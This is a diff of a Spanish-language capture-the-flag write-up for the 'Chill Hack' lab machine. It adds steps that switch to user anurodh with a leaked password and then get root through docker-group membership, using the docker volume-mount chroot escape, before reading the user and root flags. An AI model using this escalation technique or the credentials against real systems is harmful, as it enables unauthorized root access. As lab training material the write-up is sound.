@@ -424,12 +424,39 @@ Enunciado :
                         Anurodh:!d0ntKn0wmYp@ssw0rd
 
 
--LLegamsdkfkdf varias maneras de elevar segun orden. Elevamos privilegios horizontalmente www-data to anurodh y leemos flag
+- Elevamos privilegios horizontalmente www-data to anurodh con las credenciales obtenidas.
 
       ww-data@ubuntu:/var/www/files/images$ su anurodh
       Password: 
-      anurodh@ubuntu:/var/www/files/images$ id
-      uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+      anurodh@ubuntu:/var/www/files/images$ 
+
+- Elevamos privilegios verticalmente anurodh to root.
+
+  - Vemos que el usuario anurodh pertenece al grupo docker
+
+        anurodh@ubuntu:/var/www/html/secret$ id
+        uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+
+ -  Si tenemos los suficientes permisos para correr docker podemos conseguir una root shell.
+
+     [+]Metodo --> https://gtfobins.github.io/gtfobins/docker/
+
+        anurodh@ubuntu:/var/www/html/secret$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+    
+        # SHELL=/bin/bash script -q /dev/null
+        groups: cannot find name for group ID 11
+        To run a command as administrator (user "root"), use "sudo <command>".
+        See "man sudo_root" for details.
+        
+        root@dc8b9096d04d:/# cat /home/apaar/local.txt
+          {USER-FLAG: e8vpd3323cfv-------x9qtr5iq37oww}
+
+        root@dc8b9096d04d:/# cat /root/proof.txt 
+          {ROOT-FLAG: w18gfpn9xehsgd3t----------p89bg}
+
+
+---> Maquina  Chill Hack completa <---
+---
 
 
 
